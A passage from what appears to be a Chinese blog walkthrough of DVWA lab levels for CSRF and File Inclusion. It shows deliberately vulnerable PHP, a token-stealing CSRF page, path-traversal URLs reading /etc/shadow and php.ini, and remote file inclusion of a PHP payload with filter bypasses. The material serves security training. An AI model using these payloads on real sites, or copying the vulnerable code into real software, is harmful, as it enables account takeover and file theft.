match?</span></span><br><span class="line">        <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">            $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">            $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn't come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;That request didn't look correct.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>相关函数</p>
<p>stripos ( string $haystack , string $needle [, int $offset = 0 ] ) : int</p>
<p>stripos函数主要功能返回haystack中need了首次出现的数字位置。stripos()不区分大小写，可选的 offset 参数，从字符此数量的开始位置进行搜索。 如果是负数，就从字符末尾此数量的字符数开始统计。返回 needle 存在于 haystack 字符串开始的位置(独立于偏移量)。同时注意字符串位置起始于 0，而不是 1。如果未发现 needle 将返回 FALSE。</p>
<p>可以看到，Medium级别的代码检查了保留变量HTTP_REFERER(http包头的Referer参数的值，表示来源地址)中是否包含了SERVER_NAME(http包头的Host参数，及要访问的主机名，此处应为172.18.9.91)，希望可以通过这种机制抵御CSRF攻击。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/18.png" alt></p>
<p>漏洞利用</p>
<p>过滤规则是http包头的Referer参数的值中必须包含主机名，可以将攻击页面命名为<em>host</em>.html（将页面放置进攻击者服务器中）就可以绕过，</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/19.png" alt></p>
<p>通过burpsuite的截图</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/20.png" alt></p>
<p>Referer参数绕过过滤规则</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/21.png" alt></p>
<p>密码修改成功</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/22.png" alt></p>
<h3 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( $pass_new == $pass_conf ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        $insert = <span class="string">"UPDATE `users` SET password = '$pass_new' WHERE user = '"</span> . dvwaCurrentUser() . <span class="string">"';"</span>;</span><br><span class="line">        $result = mysqli_query($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $insert ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">'&lt;pre&gt;'</span> . ((is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_error($GLOBALS[<span class="string">"___mysqli_ston"</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="keyword">false</span>)) . <span class="string">'&lt;/pre&gt;'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">"___mysqli_ston"</span>]))) ? <span class="keyword">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>在高级别的源码中加入了Anti-CSRF token机制，每次访问修改密码页面时，服务器会返回一个随机的token，向服务器发起请求时需要提供token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求。</p>
<p>漏洞利用</p>
<p>要绕过High级别的反CSRF机制，关键是要获取token，要利用受害者的cookie去修改密码页面获取关键的token。</p>
<p>构造一个攻击页面，将其放置在攻击者的服务器，引诱受害者访问，从而完成CSRF攻击，下面是代码。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="actionscript">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span><span class="params">()</span></span></span></span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line"><span class="javascript">   <span class="built_in">document</span>.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value=<span class="built_in">document</span>.getElementById(<span class="string">"hack"</span>).contentWindow.document.getElementsByName(<span class="string">'user_token'</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">  <span class="built_in">document</span>.getElementById(<span class="string">"transfer"</span>).submit(); </span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://172.18.9.91/DVWA-master/vulnerabilities/csrf/"</span> <span class="attr">id</span>=<span class="string">"hack"</span> <span class="attr">border</span>=<span class="string">"0"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">"attack()"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">"GET"</span> <span class="attr">id</span>=<span class="string">"transfer"</span> <span class="attr">action</span>=<span class="string">"http://192.168.153.130/dvwa/vulnerabilities/csrf"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_new"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"password_conf"</span> <span class="attr">value</span>=<span class="string">"password"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"user_token"</span> <span class="attr">value</span>=<span class="string">""</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"Change"</span> <span class="attr">value</span>=<span class="string">"Change"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">   <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>攻击思路就是当受害者点击进入这个页面，脚本会通过一个看不见框架访问修改密码的页面，获取页面中的token，并向服务器发送改密请求，完成CSRF攻击。但是这边牵扯到跨域问题，目前浏览器是不允许跨域请求的。</p>
<p>跨域就是当我们框架iframe访问地址是<a href="http://172.18.9.91/DVWA-master/vulnerabilities/csrf/，位于服务器172.18.9.91上，如果攻击页面不是位于这个服务器上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送消息给域名B的压面，所以攻击脚本是不可能取到改密界面中的user——token。由于跨域是不能实现的，所以要将攻击代码注入到目标服务器中，才能可能完成攻击，可通过High级别的XSS漏洞协助获取Anti-CSRF" target="_blank" rel="noopener">http://172.18.9.91/DVWA-master/vulnerabilities/csrf/，位于服务器172.18.9.91上，如果攻击页面不是位于这个服务器上，两者的域名不同，域名B下的所有页面都不允许主动获取域名A下的页面内容，除非域名A下的页面主动发送消息给域名B的压面，所以攻击脚本是不可能取到改密界面中的user——token。由于跨域是不能实现的，所以要将攻击代码注入到目标服务器中，才能可能完成攻击，可通过High级别的XSS漏洞协助获取Anti-CSRF</a> token（因为这边的XSS注入有长度限制，不能够注入完整的攻击脚本，所以只获取Anti-CSRF token）</p>
<p>由于我的环境搭建在本机上，所以不属于跨域请求，所以无需通过XSS进行。</p>
<h3 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">'Change'</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">'user_token'</span> ], $_SESSION[ <span class="string">'session_token'</span> ], <span class="string">'index.php'</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $pass_curr = $_GET[ <span class="string">'password_current'</span> ];</span><br><span class="line">    $pass_new  = $_GET[ <span class="string">'password_new'</span> ];</span><br><span class="line">    $pass_conf = $_GET[ <span class="string">'password_conf'</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    $pass_curr = stripslashes( $pass_curr );</span><br><span class="line">    $pass_curr = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_curr ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">    $pass_curr = md5( $pass_curr );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    $data = $db-&gt;prepare( <span class="string">'SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;'</span> );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;bindParam( <span class="string">':password'</span>, $pass_curr, PDO::PARAM_STR );</span><br><span class="line">    $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( $pass_new == $pass_conf ) &amp;&amp; ( $data-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        $pass_new = stripslashes( $pass_new );</span><br><span class="line">        $pass_new = ((<span class="keyword">isset</span>($GLOBALS[<span class="string">"___mysqli_ston"</span>]) &amp;&amp; is_object($GLOBALS[<span class="string">"___mysqli_ston"</span>])) ? mysqli_real_escape_string($GLOBALS[<span class="string">"___mysqli_ston"</span>],  $pass_new ) : ((trigger_error(<span class="string">"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work."</span>, E_USER_ERROR)) ? <span class="string">""</span> : <span class="string">""</span>));</span><br><span class="line">        $pass_new = md5( $pass_new );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">'UPDATE users SET password = (:password) WHERE user = (:user);'</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':password'</span>, $pass_new, PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">':user'</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Password Changed.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可看到，Impossible级别的代码利用PDO技术防御sql注入，至于防护CSRF，直接要求用户输入原始密码，在位置原始密码的情况下，是无法进行CSRF攻击的。</p>
<h2 id="File-Inclusion"><a href="#File-Inclusion" class="headerlink" title="File Inclusion"></a>File Inclusion</h2><p>File Inclusion,意思是文件包含（漏洞），是指当服务器开启allow_url_include()选项时，就可以通过php的某些特性函数(include(),require()和include_once(),require_once())利用url去动态包含文件,此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为在php配置文件中的allow_url_fopen选项开启了。</p>
<p>此处不要忘记将php.ini中的allow_url_fopen值改为on，并代理服务器中要设置允许文件包含，否则在实验页面会显示没有将文件包含打开。</p>
<h3 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过源码可以看到，服务器端对page参数没有做任何的过滤检查，服务器期望用户直接点击下面的三个链接，服务器互包含相应的文件，并将结果返回，需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确实为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取或任意命令执行。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/23.png" alt></p>
<p>点击file1.php后显示内容如下：</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/24.png" alt></p>
<p>但是在现实情况中，恶意的攻击者是不会直接点击这些链接，因此page参数时不可控的。</p>
<p>漏洞利用</p>
<p>1.本地文件包含</p>
<p>构造url</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/fi/</span>?page=<span class="regexp">/etc/</span>shadow</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/25.png" alt></p>
<p>返回的报文显示没有此文件，说明服务器系统不是Linux，但是暴露了服务器文件的绝对路径 D:\phpStudy\WWW</p>
<p>可以构造url（绝对路径）</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/fi/?page=D:<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\D</span>VWA-master<span class="symbol">\p</span>hp.ini</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/26.png" alt></p>
<p>成功读取到服务器的php.ini文件</p>
<p>也可构造url（相对路径）</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/fi/?page=..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\D</span>VWA-master<span class="symbol">\p</span>hp.ini</span><br></pre></td></tr></table></figure>

<p>通过加入多个<code>..\</code>保证到达服务器的根目录，可以看到也是可以读取的。</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/27.png" alt></p>
<p>同时我们看到，配置文件中的Magic_quote_gpc选项为off，在php版本小于5.3.4的服务器中，当Magic_quote_gpc选项为off时，可以在文件名中使用%00进行截断，也就是说文件名中%00后的内容不会被识别，即下面两个url是完全等效的。</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/fi/?page=..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\D</span>VWA-master<span class="symbol">\p</span>hp.ini</span><br><span class="line"></span><br><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/fi/?page=..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\D</span>VWA-master<span class="symbol">\p</span>hp.ini<span class="variable">%0012.php</span></span><br></pre></td></tr></table></figure>

<p>将phpstudy中的php版本进行降级，发现是可以显示的</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/28.png" alt></p>
<p>使用%00截断可以绕过某些过滤规则，例如要求page参数的后缀必须为php,这时第一个链接会读取失败，第二个链接可以成功绕过规则进行读取。</p>
<p>2.远程文件包含</p>
<p>当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。</p>
<p>在远程服务器上传一个phpinfo.txt文件，内容如下：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">	phpinfo();</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>构造url</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/DVWA-master/</span>vulnerabilities<span class="regexp">/fi/</span>?page=http:<span class="regexp">//</span><span class="number">172.18</span>.<span class="number">9.91</span><span class="regexp">/phpinfo.txt</span></span><br></pre></td></tr></table></figure>

<p>成功在服务器上执行phpinfo函数</p>
<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/29.png" alt></p>
<p>为增加隐蔽性，可将<a href="http://172.18.9.91/phpinfo.txt进行编码" target="_blank" rel="noopener">http://172.18.9.91/phpinfo.txt进行编码</a></p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://172.18.9.91/DVWA-master/vulnerabilities/fi/?page=http<span class="number">%3</span>A<span class="number">%2</span>F<span class="number">%2</span>F172.18.9.91<span class="number">%2</span>Fphpinfo.txt</span><br></pre></td></tr></table></figure>

<p>同样是可以执行成功的。</p>
<h3 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h3><p>服务器端源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line">$file = $_GET[ <span class="string">'page'</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"http://"</span>, <span class="string">"https://"</span> ), <span class="string">""</span>, $file );</span><br><span class="line">$file = str_replace( <span class="keyword">array</span>( <span class="string">"../"</span>, <span class="string">"..\""</span> ), <span class="string">""</span>, $file );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>从源码中可以看到，Medium级别的代码增加了str_replace函数，对page参数进行了一定的处理，将<code>http://</code>、<code>https://</code>、<code>../</code>、<code>..\</code>替换成空字符，即将其删除。</p>
<p>漏洞利用</p>
<p>使用str_replace函数是极其不安全的，因为可以使用双写绕过替换规则。例如：page=ht<a href="http://tp://172.18.9.91/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://172.18.9.91/phpinfo.txt，成功执行远程命令。同时，因为替换的是`" target="_blank" rel="noopener">http://tp://172.18.9.91/phpinfo.txt时，str_replace函数会将http://删除，于是page=http://172.18.9.91/phpinfo.txt，成功执行远程命令。同时，因为替换的是`</a> ../ <code>、</code> ..\ `，所以对采用绝对路径的方式包含是不会受到任何限制的。</p>
<p>1.本地文件包含</p>
<figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.18.9.91/DVWA-master/vulnerabilities/fi/?page=..<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\.</span>.<span class="symbol">\p</span>hpStudy<span class="symbol">\W</span>WW<span class="symbol">\D</span>VWA-master<span class="symbol">\p</span>hp.ini</span><br></pre></td></tr></table></figure>

<p><img src="/2020/06/29/DVWA%E5%85%B3%E5%8D%A1%E7%BA%AA%E5%BD%95/30.png" alt></p>
<p>读取配置文件成功</p>
<p>同样绝对路径也不会有影响</p>
